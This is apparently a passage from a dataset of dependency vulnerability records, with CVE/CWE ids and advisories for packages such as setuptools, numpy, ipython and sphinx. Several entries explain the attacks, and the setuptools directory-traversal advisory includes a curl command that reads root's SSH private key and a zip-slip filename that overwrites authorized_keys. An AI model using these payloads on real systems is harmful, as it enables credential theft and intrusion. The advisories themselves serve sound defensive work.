plone_Products.CMFPlone,Products.CMFCore,,True,CVE-2021-33507,CWE-79,2021-05-21,"Zope是Zope（ZOPE）社区的一套使用Python语言编写的、面向对象的开源Web应用服务器。
Zope Products.CMFCore2.5.1之前和PluggableAuthService2.6.2之前存在跨站脚本漏洞，该漏洞源于允许反射XSS。",3,0
plone_Products.CMFPlone,Products.CMFCore,,True,CVE-2023-36814,CWE-770,2023-07-03,"Products.CMFCore是Zope内容管理框架 (CMF) 的关键框架服务。
Zope Products.CMFCore 3.2之前版本存在安全漏洞，该漏洞源于存在未经检查的输入，可能会导致未经身份验证的拒绝服务和崩溃。",2,2
plone_Products.CMFPlone,Products.isurlinportal,,True,CVE-2021-32806,CWE-601,2021-08-02,"Plone是一套基于Zope应用服务器构建的开源内容管理系统（CMS）。
Plone存在输入验证错误漏洞，攻击者可利用该漏洞可能会利用这个将受害者重定向到他们的网站，特别是作为网络钓鱼攻击的一部分。",2,0
plone_Products.CMFPlone,Products.PlonePAS,,True,CVE-2009-0662,CWE-287,2009-04-23,Plone PlonePAS product 3.9之前的3.x版本和3.2.2之前的3.2.x版本没有正确的处理登录格式，远程认证用户可以借助未明向量，获得任意用户的身份。,3,0
plone_Products.CMFPlone,Products.PluggableAuthService,,True,CVE-2021-21337,CWE-601,2021-03-08,"Jens Vagelpohl Products.PluggableAuthService是  （Jens Vagelpohl）开源的一个应用程序。该产品定义了一个可完全插入的用户文件夹，供所有Zope网站使用。
Products.PluggableAuthService before version 2.6.0 存在安全漏洞，该漏洞源于一个打开的重定向漏洞。恶意制作的登录表单和登录功能链接可能会将浏览器重定向到另一个网站。",3,1
plone_Products.CMFPlone,Products.PluggableAuthService,,True,,CWE-352,2021-07-02,"## Overview
[Products.PluggableAuthService](https://pypi.org/project/Products.PluggableAuthService) is a Pluggable Zope authentication / authorization framework

Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to faulty CSRF token acces.
## Remediation
Upgrade `Products.PluggableAuthService` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/zopefoundation/Products.PluggableAuthService/commit/6476278d96b82c230a91d72f4e969da6add1a68c)
- [GitHub Issue](https://github.com/zopefoundation/Products.PluggableAuthService/issues/99)
",3,2
plone_Products.CMFPlone,Products.PluggableAuthService,,True,,CWE-284,2021-04-01,"## Overview
[Products.PluggableAuthService](https://pypi.org/project/Products.PluggableAuthService) is a Pluggable Zope authentication / authorization framework

Affected versions of this package are vulnerable to Access Restriction Bypass. Multiple login string transformation methods are set to public which could lead to Access Control issues. The vulnerability is likely not exploitable.
## Remediation
Upgrade `Products.PluggableAuthService` to version 2.6.2 or higher.
## References
- [GitHub Commit](https://github.com/zopefoundation/Products.PluggableAuthService/commit/981f41a0c6404f0ac6c41b107dc83029dd9979ea)
",4,0
plone_Products.CMFPlone,Products.PluggableAuthService,,True,CVE-2021-21336,CWE-200,2021-03-08,"Jens Vagelpohl Products.PluggableAuthService是  （Jens Vagelpohl）开源的一个应用程序。该产品定义了一个可完全插入的用户文件夹，供所有Zope网站使用。
Products.PluggableAuthService 存在信息泄露漏洞，该漏洞允许任何人列出在该插件中定义的角色名称。",2,0
pulp_pulp,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
pulp_pulp,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
pulp_pulp,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
pulp_pulp,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
pulp_pulp,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
pulp_pulp,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
pulp_pulp,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
pulp_pulp,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
pulp_pulp,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
python-pillow_Pillow,ipython,,True,CVE-2015-4707,CWE-79,2015-06-22,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。

Ipython 3.2之前的版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。",3,0
python-pillow_Pillow,ipython,,True,CVE-2015-4706,CWE-79,2015-06-22,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。
Ipython 3.2之前的3.x版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。",3,0
python-pillow_Pillow,ipython,,True,CVE-2022-21699,CWE-250 CWE-279 CWE-269,2022-01-19,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
Interactive Python 存在安全漏洞，攻击者可利用该漏洞以另一个用户的身份运行代码。",2,0
python-pillow_Pillow,ipython,,True,CVE-2015-5607,CWE-352,2017-09-20,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。REST API是其中的一个支持轻量级REST风格Web脚本的API。
IPython 2版本和3版本中的REST API存在跨站请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。",2,0
python-pillow_Pillow,ipython,,True,CVE-2023-24816,CWE-20 CWE-78,2023-02-10,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
IPython(Interactive Python) 8.1.0之前版本存在操作系统命令注入漏洞。攻击者利用该漏洞执行命令注入攻击。",4,0
python-pillow_Pillow,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
python-pillow_Pillow,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
python-pillow_Pillow,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
python-pillow_Pillow,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
python-pillow_Pillow,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
python-pillow_Pillow,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
python-pillow_Pillow,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
python-pillow_Pillow,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
python-pillow_Pillow,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
python-pillow_Pillow,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
python-pillow_Pillow,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
python_cpython,playwright-core,1.54.1,False,CVE-2025-59288,CWE-347,2025-10-14,GitHub 是一个广泛使用的版本控制和协作开发平台，主要用于托管和管理代码仓库、版本控制以及团队协作等功能。此漏洞是由于 GitHub 在处理加密签名时存在验证不足的问题。具体来说，加密签名的验证过程存在缺陷，导致攻击者可以通过邻近网络伪造身份。,3,2
roundup-tracker_roundup,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
roundup-tracker_roundup,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
roundup-tracker_roundup,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
roundup-tracker_roundup,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
roundup-tracker_roundup,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
